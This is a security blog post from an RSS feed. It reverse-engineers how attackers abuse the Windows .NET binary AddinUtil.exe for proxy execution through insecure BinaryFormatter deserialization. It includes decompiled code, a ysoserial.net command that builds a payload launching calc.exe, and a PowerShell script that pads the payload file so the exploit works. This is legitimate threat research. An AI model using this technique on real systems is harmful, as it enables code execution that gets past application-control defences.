<?xml version="1.0" encoding="UTF-8"?>
<rss  xmlns:atom="http://www.w3.org/2005/Atom" 
      xmlns:media="http://search.yahoo.com/mrss/" 
      xmlns:content="http://purl.org/rss/1.0/modules/content/" 
      xmlns:dc="http://purl.org/dc/elements/1.1/" 
      version="2.0">
<channel>
<title>Blue-Prints Blog</title>
<link>https://www.blue-prints.blog/index.html</link>
<atom:link href="https://www.blue-prints.blog/index.xml" rel="self" type="application/rss+xml"/>
<description>A blog for technical information security topics and interesting things we find along the way.</description>
<generator>quarto-1.3.287</generator>
<lastBuildDate>Mon, 18 Sep 2023 04:00:00 GMT</lastBuildDate>
<item>
  <title>Insecure Deserialization in AddinUtil.exe</title>
  <dc:creator>Tony Latteri, Michael McKinley</dc:creator>
  <link>https://www.blue-prints.blog/content/blog/posts/lolbin/addinutil-lolbas.html</link>
  <description><![CDATA[ 




<section id="tldr" class="level3">
<h3 class="anchored" data-anchor-id="tldr">TLDR;</h3>
<p>Our investigation discovered an adversary exploiting an undocumented attack using the native Microsoft .NET binary AddinUtil.exe to proxy execution. We go on a journey to reproduce their attack, document the LOLBAS technique, and provide detection opportunities to the community.</p>
</section>
<section id="introduction" class="level3">
<h3 class="anchored" data-anchor-id="introduction">Introduction</h3>
<p>Microsoft’s <a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-block-rules">recommended block rules</a> for Windows Defender Application Control (WDAC) is a fairly extensive list of legitimate binaries often exploited by malicious actors seeking to execute code. Nevertheless, those curious about the reasons behind these binaries’ inclusion on the list may be disappointed by the lack of available information. During an investigation we encountered an adversary leverging <code>AddinUtil.exe</code> for execution <a href="https://attack.mitre.org/techniques/T1218/">T1218</a>, a binary in the WDAC recommended block list, and began researching.</p>
<p><strong>Understanding AddinUtil.exe</strong></p>
<p>The legitimate use case for AddinUtil is somewhat elusive, it appears to be related to Microsoft Office Add-Ins, with the help message stating:</p>
<blockquote class="blockquote">
<p>“This tool updates the cache file in the specified folder, informing the add-in model that new add-in segments have been deployed into this folder. The pipeline root should be a folder containing subfolders for various add-in segments like host adapters, contracts, an optional AddIns subfolder, etc.”</p>
</blockquote>
<p>Additionally, AddinUtil.exe is relatively old and dates back to at least version 3.5 of the .NET framework (November 2007).</p>
<p>With general information about the binary limited, and the absence of public threat research, we found ourselves at square one in determining the method of proxy execution.</p>
<p>Fortunately, AddinUtil.exe is a C# application. This makes it relatively straightforward to disssect and analyze the execution flow with tools such as <a href="https://github.com/dnSpyEx/dnSpy">dnSpy</a>.</p>
</section>
<section id="observed-technique" class="level3">
<h3 class="anchored" data-anchor-id="observed-technique">Observed Technique</h3>
<p>We observed the threat actor create a folder masquerading as an Outlook CRM plugin. The adversary also created a file with an unknown extension called <code>AddIns.store</code>. Finally, the actor proceeded to switch their current working directory to the Outlook CRM plugin folder and execute <code>AddinUtil.exe</code> with the following command:</p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb1-1">C:\Users\User\Desktop\CRM_Outlook_Addin&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInUtil.exe -AddinRoot:.</span></code></pre></div>
<p>The command line parameter <code>-AddinRoot</code> gave us a good starting point to begin a deeper investigation into the AddinUtil binary. The argument “.” indicates the execution directory of <code>C:\Users\User\Desktop\CRM_Outlook_Addin</code>, which contained the <code>AddIns.store</code> file. Using these key pieces of information, dynamic analysis of the binary began.</p>
<p>Our first aim is to understand how <code>AddIns.store</code> is loaded by AddInUtil.exe using the <code>-AddinRoot:</code> parameter.</p>
<p>We replicated the same folder structure, file names, and command-line arguments; however, we left our <code>AddIns.store</code> file empty because we did not have the original.</p>
<p>Our first execution produced the following output:</p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb2-1">C:\Users\User\Desktop\CRM_Outlook_Addin&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInUtil.exe -AddinRoot:.</span>
<span id="cb2-2">Error: System.InvalidOperationException: Add-In deployment cache file C:\Users\User\Desktop\CRM_Outlook_Addin\AddIns.store is corrupted. </span>
<span id="cb2-3">Please use AddInUtil and rebuild this store.</span>
<span id="cb2-4">   at System.AddIn.Hosting.AddInStore.ReadCache<span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">T</span><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">](String storeFileName, Boolean mustExist)</span></span>
<span id="cb2-5">   at System.AddIn.Hosting.AddInStore.GetDeploymentState(String path, String storeFileName, Reader reader, Builder stateBuilder)</span>
<span id="cb2-6">   at System.AddIn.Hosting.AddInStore.GetAddInDeploymentState(String addinRoot)</span>
<span id="cb2-7">   at System.AddIn.Hosting.AddInStore.AddInStoreIsOutOfDate(String addInPath)</span>
<span id="cb2-8">   at System.AddIn.Hosting.AddInStore.UpdateAddInsIfExist(String addInsPath, Collection`1 warningsCollection)</span>
<span id="cb2-9">   at System.AddIn.Hosting.AddInStore.UpdateAddIns(String addInsFolderPath)</span>
<span id="cb2-10">   at System.Tools.AddInUtil.Main(String[] args)</span></code></pre></div>
<p>From the stack trace produced, our attention shifted to the <code>System.AddIn.Hosting.AddInStore.ReadCache</code> method which references a <code>BinaryFormatter</code> object and an invocation of <code>BinaryFormatter.Deserialize</code> on line 24.</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode cs code-with-copy"><code class="sourceCode cs"><span id="cb3-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">private</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">static</span> T ReadCache<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>T<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">string</span> storeFileName<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">bool</span> mustExist<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb3-2">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-3">            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">SecurityPermission</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>SecurityPermissionFlag<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">SerializationFormatter</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Demand</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb3-4">            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">FileIOPermission</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>FileIOPermissionAccess<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Read</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> FileIOPermissionAccess<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PathDiscovery</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> storeFileName<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">).</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Assert</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb3-5">            BinaryFormatter binaryFormatter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">BinaryFormatter</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb3-6">            T t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">default</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>T<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb3-7">            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>File<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Exists</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>storeFileName<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb3-8">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-9">                <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">for</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> i <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> i <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span> i<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">++)</span></span>
<span id="cb3-10">                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-11">                    <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">try</span></span>
<span id="cb3-12">                    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-13">                        <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">using</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Stream stream <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> File<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">OpenRead</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>storeFileName<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb3-14">                        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-15">                            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>stream<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Length</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> 12L<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb3-16">                            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-17">                                <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">throw</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">InvalidOperationException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">string</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>CultureInfo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CurrentCulture</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Res<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">DeployedAddInsFileCorrupted</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">object</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> storeFileName <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}));</span></span>
<span id="cb3-18">                            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-19">                            BinaryReader binaryReader <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">BinaryReader</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>stream<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb3-20">                            <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> num <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> binaryReader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ReadInt32</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb3-21">                            <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">long</span> num2 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> binaryReader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ReadInt64</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb3-22">                            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">try</span></span>
<span id="cb3-23">                            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-24">                                t <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>T<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)((</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">object</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span>binaryFormatter<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Deserialize</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>stream<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">));</span></span>
<span id="cb3-25">                            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-26">                            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">catch</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Exception ex<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb3-27">                            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-28">                                <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">throw</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">InvalidOperationException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">string</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>CultureInfo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CurrentCulture</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Res<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CantDeserializeData</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">object</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> storeFileName <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}),</span> ex<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb3-29">                            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-30">                        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-31">                        <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">break</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb3-32">                    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-33">                    <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">catch</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>IOException ex2<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb3-34">                    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-35">                        <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>Marshal<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">GetHRForException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>ex2<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2147024864</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb3-36">                        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-37">                            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">throw</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb3-38">                        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-39">                        Thread<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Sleep</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">500</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">);</span></span>
<span id="cb3-40">                    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-41">                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-42">                <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> t<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb3-43">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-44">            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">if</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>mustExist<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb3-45">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span></span>
<span id="cb3-46">                <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">throw</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">InvalidOperationException</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">string</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Format</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>CultureInfo<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CurrentCulture</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Res<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">CantFindDeployedAddInsFile</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">new</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">object</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> storeFileName <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}));</span></span>
<span id="cb3-47">            <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb3-48">            <span class="kw" style="color: #003B4F;
background-color: null;
font-style: inherit;">return</span> t<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb3-49">        <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>Upon discovering the usage of <code>BinaryFormatter.Deserialize</code>, we recognized the risk, given its reputation for being insecure. Microsoft states:</p>
<blockquote class="blockquote">
<p>“…assume that calling BinaryFormatter.Deserialize over a payload is the equivalent of interpreting that payload as a standalone executable and launching it.”</p>
</blockquote>
<p>To replicate the attack, we realized the need to exploit a deserialization vulnerability in AddinUtil for proxy execution. Alvaro Muñoz’s project, <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>, offers an excellent toolset for crafting payloads to exploit various .NET deserialization vulnerabilities.</p>
</section>
<section id="proof-of-concept" class="level3">
<h3 class="anchored" data-anchor-id="proof-of-concept">Proof of Concept</h3>
<p>To reproduce the attack we began with the .NET gadget <code>TextFormattingRunProperties</code>, chosen for its smaller size. It’s worth noting that many other gadgets are available; experiment and determine which you prefer. Our payload is crafted with the following arguments:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb4-1">ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c calc.exe -o raw &gt;&gt; C:\Users\User\Desktop\CRM_Outlook_Addin\Addins.Store</span></code></pre></div>
<p>If successful the payload will launch the Windows calculator app. However, we instead recieved the error:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb5-1">C:\Users\User\Desktop\CRM_Outlook_Addin&gt;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\AddInUtil.exe -AddinRoot:.</span>
<span id="cb5-2">Rerunning this Error: System.InvalidOperationException: The Add-in store is corrupt. Please use AddInUtil and rebuild this store: C:\Users\User\Desktop\CRM_Outlook_Addin\AddIns.store ---&gt; System.Runtime.Serialization.SerializationException: The input stream is not a valid binary format. The starting contents (in bytes) are: 00-00-00-00-00-0C-02-00-00-00-57-53-79-73-74-65-6D ...</span>
<span id="cb5-3">   at System.Runtime.Serialization.Formatters.Binary.SerializationHeaderRecord.Read(__BinaryParser input)</span>
<span id="cb5-4">   ...</span></code></pre></div>
<p>This error is interesting; suggesting the input <code>AddIns.store</code> file isn’t correctly formatted and the binary format did not deserialize as expected. It also provides the starting bytes of <code>00-00-00-00-00-0C-02</code>. Looking at the actual starting bytes of the file, we see <code>00-01-00-00-00-FF-FF</code>. The byte sequence provided by the error code starts at offset <code>0x0C</code>, rather than <code>0x00</code>.</p>
<p>Looking back at the ReadCache code, we see two very important lines preceding the Deserialization method:</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode cs code-with-copy"><code class="sourceCode cs"><span id="cb6-1"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">int</span> num <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> binaryReader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ReadInt32</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span>
<span id="cb6-2"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">long</span> num2 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> binaryReader<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ReadInt64</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">();</span></span></code></pre></div>
<p>These two methods are responsible for effectively shifting the binary stream by 4-bytes and 8-bytes respectively. This causes the <code>AddIns.store</code> file to be read starting at the 13th byte (offset <code>0x0C</code>). To account for this, we need to pad our <code>AddIns.store</code> file by 12 bytes. This can be accomplished with the below powershell script.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb7-1"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$filePath</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"C:\Users\User\Desktop\CRM_Outlook_Addin\AddIns.Store"</span></span>
<span id="cb7-2"></span>
<span id="cb7-3"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$existingContent</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Get-Content</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Path <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$filePath</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Encoding <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Byte</span></span>
<span id="cb7-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$modifiedContent</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">byte</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[]](</span>0<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> 12 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$existingContent</span></span>
<span id="cb7-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$modifiedContent</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Set-Content</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Path <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$filePath</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Encoding <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Byte</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>NoNewline</span></code></pre></div>
